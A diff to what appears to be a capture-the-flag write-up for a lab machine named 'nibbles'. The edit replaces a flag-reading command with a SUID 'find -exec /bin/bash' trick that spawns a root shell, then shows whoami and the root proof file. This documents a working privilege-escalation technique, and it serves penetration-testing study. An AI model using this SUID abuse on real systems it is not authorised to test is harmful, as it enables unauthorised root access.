@@ -347,8 +347,13 @@ find / -perm -u=s -type f 2>/dev/null
 The `find` command has an `-exec` argument that will execute a specified command, and with the suid bit set, the command will also be executed with root privileges. This gives us the ability to not only read the root flag, but also manipulate config files or create new users.
 
 ```shell
-postgres@nibbles:/var/lib/postgresql/11/main$ find PG_VERSION -exec cat /root/proof.txt \;
-find PG_VERSION -exec cat /root/proof.txt \;
+postgres@nibbles:/var/lib/postgresql/11/main$ find . -exec /bin/bash \;
+find . -exec /bin/bash \; -quit
+# whoami
+whoami
+root
+# cat /root/proof.txt
+cat /root/proof.txt
 fd8334ae00d76615d69931c449c61301
 ```
 
